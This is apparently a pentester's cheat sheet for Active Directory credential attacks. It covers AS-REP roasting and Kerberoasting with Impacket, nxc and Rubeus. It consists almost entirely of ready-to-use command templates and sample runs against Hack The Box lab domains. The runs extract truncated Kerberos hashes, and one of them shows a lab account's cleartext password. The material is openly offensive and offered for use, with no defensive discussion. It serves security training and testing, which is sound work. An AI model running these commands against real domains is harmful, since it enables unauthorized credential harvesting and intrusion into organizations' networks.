---
title: "Kerberoasting"
date: 2024-7-6
tags: ["Kerberos", "Impacket", "Kerberoasting", "Asreproast", "Rubeus", "Domain Controller", "Active Directory", "Windows", "GetNPUsers"]
---

### AS_REP Roasting

{{< tab set1 tab1 active >}}Impacket{{< /tab >}}
{{< tab set1 tab2 >}}nxc{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
# Multiple valid usernames
impacket-GetNPUsers <DOMAIN>/ -usersfile <USERS_FILE> -no-pass -dc-ip <DC_IP>
```

```console {class="sample-code"}
$ impacket-GetNPUsers ABSOLUTE.HTB/ -usersfile valid_usernames.txt -no-pass -dc-ip DC.ABSOLUTE.HTB
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[-] User j.roberts doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User m.chaffrey doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User s.osvald doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$d.klay@ABSOLUTE.HTB:85554d22d5c220d8a757ce9913d207ea$7288c91ca ...[SNIP]... 0e09c5d9d1
[-] User j.robinson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User n.smith doesn't have UF_DONT_REQUIRE_PREAUTH set
```

```console
# Single user without creds
impacket-GetNPUsers -no-pass -dc-ip <DC_IP> '<DOMAIN>/<USER>'
```

```console {class="sample-code"}
$ impacket-GetNPUsers -no-pass -dc-ip 10.10.11.181 ABSOLUTE.HTB/d.klay
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for d.klay
$krb5asrep$23$d.klay@ABSOLUTE.HTB:97c9a3ec7b550c29bc52f0c176738e73$ab25b07d4 ...[SNIP]... 78a8e52bb6
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

```console
# Multiple valid usernames
nxc ldap <DC> -u <USERS_FILE> -p '' --asreproast as_rep_hashes.txt
```

```console {class="sample-code"}
$ nxc ldap 10.10.11.181 -u valid_usernames.txt -p '' --asreproast as_rep_hashes.txt
SMB         10.10.11.181    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.181    445    DC               $krb5asrep$23$d.klay@ABSOLUTE.HTB:5a082acfc8 ...[SNIP]... 06ddb9be16
```

{{< /tabcontent >}}

---

### Kerberoasting (From Linux)

{{< tab set2 tab1 active >}}Impacket{{< /tab >}}
{{< tab set2 tab2 >}}nxc{{< /tab >}}
{{< tabcontent set2 tab1 >}}

```console
sudo ntpdate -s <DC> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>:<PASSWORD>' -k -dc-host <DC>
```

```console {class="sample-code"}
$ sudo ntpdate -s DC1.scrm.local && impacket-GetUserSPNs -request 'scrm.local/ksimpson:ksimpson' -k -dc-host DC1.scrm.local
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-04 00:32:02.351452  2024-09-24 15:53:26.496449             
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-04 00:32:02.351452  2024-09-24 15:53:26.496449             

[-] CCache file is not found. Skipping...
$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$b62984d5b ...[SNIP]... f4c2161493
```

<small>*Note: Times skew have to be within 5 minutes in kerberos*</small>

```console
# Kerberoasting without cred
sudo ntpdate -s <DC> && impacket-GetUserSPNs -no-preauth <USER_WITH_DONT_REQUIRE_PREAUTH> -usersfile <USERS_FILE> -dc-host <DC> <DOMAIN>/
```

```console {class="sample-code"}
$ sudo ntpdate -s dc01.rebound.htb && impacket-GetUserSPNs -no-preauth jjones -usersfile valid_usernames.txt -dc-host 10.10.11.231 rebound.htb/
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[-] Principal: Administrator - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Guest - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$18$krbtgt$REBOUND.HTB$*krbtgt*$d989a5d49 ...[SNIP]... 962d2aa2f2
...[SNIP]...
```

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

```console
sudo ntpdate -s <DC> && nxc ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' -k --kerberoasting kerberoast_hashes.txt
```

```console {class="sample-code"}
$ sudo ntpdate -s DC1.scrm.local && nxc ldap 10.10.11.168 -u ksimpson -p 'ksimpson' -k --kerberoasting kerberoast_hashes.txt
LDAP        10.10.11.168    389    DC1.scrm.local   [*]  x64 (name:DC1.scrm.local) (domain:scrm.local) (signing:True) (SMBv1:False)
LDAPS       10.10.11.168    636    DC1.scrm.local   [+] scrm.local\ksimpson 
LDAPS       10.10.11.168    636    DC1.scrm.local   Bypassing disabled account krbtgt 
LDAPS       10.10.11.168    636    DC1.scrm.local   [*] Total of records returned 2
LDAPS       10.10.11.168    636    DC1.scrm.local   sAMAccountName: sqlsvc memberOf:  pwdLastSet: 2021-11-04 00:32:02.351452 lastLogon:2024-09-24 15:53:26.496449
LDAPS       10.10.11.168    636    DC1.scrm.local   $krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$335aeba3b ...[SNIP]... 9718487474
```

{{< /tabcontent >}}

### Kerberoasting (From Windows)

{{< tab set3 tab1 active >}}rubeus{{< /tab >}}
{{< tabcontent set3 tab1 >}}

```console
.\rubeus.exe kerberoast /creduser:<DOMAIN>\<USER> /credpassword:'<PASSWORD>'
```

{{< /tabcontent >}}
